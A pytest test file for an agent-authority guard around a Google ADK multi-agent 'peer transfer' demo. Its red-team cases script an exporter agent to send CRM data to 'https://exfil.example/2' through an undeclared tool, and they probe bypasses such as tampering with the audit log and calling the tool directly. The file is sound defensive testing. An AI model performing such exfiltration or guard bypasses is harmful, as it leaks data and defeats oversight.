"""The gate for the ADK peer-transfer recipe (examples/integrations/google_adk/peer_transfer/).

Two tiers: COMPATIBILITY (imports, the ADK API we touch) and SEMANTIC (the upstream behaviour the story
relies on, pinned to a version and an execution path). Then the side-effect oracle and the bypass cases.
"""
from __future__ import annotations

import asyncio
import importlib.metadata
import importlib.util
import os
import stat
from pathlib import Path

import pytest

pytest.importorskip("google.adk")

from attenu_guard import AuditLog, evidence  # noqa: E402
from attenu_guard.wire import HS256TestSigner  # noqa: E402

PINNED = {"package": "google-adk", "version": "2.7.1",
          "path": "google/adk/workflow/utils/_transfer_utils.py (sibling case)",
          "upstream_fix": "fa18d26a — touched flows/llm_flows/base_llm_flow.py only"}

_DEMO = Path(__file__).resolve().parents[2] / "examples" / "integrations" / "google_adk" / "peer_transfer" / "demo.py"
_spec = importlib.util.spec_from_file_location("attenu_adk_peer_transfer_demo", _DEMO)
pt = importlib.util.module_from_spec(_spec); _spec.loader.exec_module(pt)  # type: ignore[union-attr]


# ---- tier 1: compatibility --------------------------------------------------------------------------------
def test_compat_adk_importable_and_version_known():
    v = importlib.metadata.version("google-adk")
    assert v, "google-adk not installed"
    # drift is allowed here; the semantic tier decides whether the story still holds
    print(f"google-adk {v} (pinned story: {PINNED['version']})")


# ---- tier 2: semantic freshness ---------------------------------------------------------------------------
def test_semantic_2x_path_still_transfers_to_a_peer():
    events, sink = asyncio.run(pt.run_unguarded())
    assert pt.transferred_to(events, "exporter"), (
        f"PREMISE CHANGED: ADK {importlib.metadata.version('google-adk')} now enforces disallow_transfer_to_peers on "
        f"{PINNED['path']} — retire step 1 of the story (steps 2–3 still hold). Pinned: {PINNED}")
    assert sink, "transfer happened but the export body did not run — the unguarded control lost its oracle"


# ---- the side-effect oracle -------------------------------------------------------------------------------
def test_side_effect_oracle_denied_export_left_no_trace(tmp_path):
    events, sink, root_guard, plugin = asyncio.run(pt.run_guarded(audit_path=tmp_path / "audit.jsonl"))
    fr = pt.function_responses(events)
    assert pt.transferred_to(events, "exporter")                       # ADK's decision, unchanged
    assert fr["crm_export"]["error"] == "authority_denied"
    assert sink == [], f"denied export still executed: {sink}"
    entries = root_guard.audit_log().entries
    assert any(e["event"] == "deny" and e.get("tool") == "crm_export" for e in entries)
    assert AuditLog.verify(entries)[0]


def test_authority_is_monotonic_down_the_chain(tmp_path):
    _, _, root_guard, plugin = asyncio.run(pt.run_guarded(audit_path=tmp_path / "a.jsonl"))
    analyst, exporter = plugin.guard_for("analyst"), plugin.guard_for("exporter")
    assert exporter.is_narrower_than(analyst) and analyst.is_narrower_than(root_guard)
    assert not analyst.is_narrower_than(exporter) or analyst.authority == exporter.authority


# ---- bypass cases (red team) ------------------------------------------------------------------------------
def test_bypass_undeclared_alternate_tool_is_denied_by_default(tmp_path):
    shadow: list = []

    def crm_export_backup(destination: str) -> dict:
        """A second export tool the operator never declared."""
        shadow.append(("crm_export_backup", destination)); return {"exported_to": destination}

    model_script = pt.script()
    model_script["exporter"] = [pt._fc("crm_export_backup", destination="https://exfil.example/2"), pt._text("done")]
    sink: list = []
    from attenu_guard import Guard
    root_guard = Guard.issue("root", pt.parent.ROOT_AUTHORITY, task="route", audit_path=tmp_path / "b.jsonl")
    app = pt.App(name="adk-alt", root_agent=pt.build_tree(pt.parent.ScriptedLlm(script=model_script), sink,
                                                          extra_exporter_tools=[crm_export_backup]),
                 plugins=[pt.build_plugin(root_guard)])
    events = asyncio.run(pt._drive(app))
    fr = pt.function_responses(events)
    assert fr["crm_export_backup"]["error"] == "authority_denied"
    assert shadow == [] and sink == []


def test_bypass_retries_stay_denied_and_each_attempt_is_on_the_ledger(tmp_path):
    events, sink, root_guard, _ = asyncio.run(pt.run_guarded(audit_path=tmp_path / "c.jsonl", export_calls=3))
    assert sink == []
    denies = [e for e in root_guard.audit_log().entries if e["event"] == "deny" and e.get("tool") == "crm_export"]
    assert len(denies) == 3, f"expected 3 denials on the ledger, got {len(denies)}"


def test_bypass_guard_absent_refuses_to_run():
    sink: list = []
    app = pt.App(name="adk-noguard", root_agent=pt.build_tree(pt.parent.ScriptedLlm(script=pt.script()), sink))
    with pytest.raises(RuntimeError, match="refusing to run unguarded"):
        pt.require_guard(app)


def test_bypass_direct_python_call_is_outside_the_boundary():
    """Documented, not prevented: mediation covers ADK's dispatch, not arbitrary Python."""
    sink: list = []
    pt.parent.make_crm_export(sink)("https://direct.example")
    assert sink == [("crm_export", "https://direct.example")]


@pytest.mark.skipif(os.geteuid() == 0, reason="root ignores file permissions")
def test_bypass_audit_write_failure_fails_closed(tmp_path):
    log = tmp_path / "d.jsonl"
    from attenu_guard import Guard
    root_guard = Guard.issue("root", pt.parent.ROOT_AUTHORITY, task="route", audit_path=log)
    log.chmod(stat.S_IRUSR)                                         # the ledger becomes unwritable mid-run
    sink: list = []
    app = pt.App(name="adk-nolog", root_agent=pt.build_tree(pt.parent.ScriptedLlm(script=pt.script()), sink),
                 plugins=[pt.build_plugin(root_guard)])
    try:
        asyncio.run(pt._drive(app))
    except Exception:                                               # noqa: BLE001 — an error is an acceptable outcome
        pass
    finally:
        log.chmod(stat.S_IRUSR | stat.S_IWUSR)
    assert sink == [], f"tool body ran although the ledger could not be written: {sink}"


def test_bypass_tampered_bundle_fails_and_clean_bundle_passes(tmp_path):
    _, _, root_guard, _ = asyncio.run(pt.run_guarded(audit_path=tmp_path / "e.jsonl"))
    signer = HS256TestSigner(b"k", kid="t")
    bundle = evidence.export_bundle(root_guard.audit_log(), signer)
    rep = evidence.verify_bundle(bundle, signer)
    assert rep["ok"] and all(rep["checks"].values()), rep
    import copy, json
    bad = copy.deepcopy(bundle)
    deny = next(e for e in bad["entries"] if e["event"] == "deny")
    deny["event"] = "allow"                                          # rewrite a denial into an allow
    rep2 = evidence.verify_bundle(bad, signer)
    assert not rep2["ok"] and not rep2["checks"]["integrity"], json.dumps(rep2)[:300]
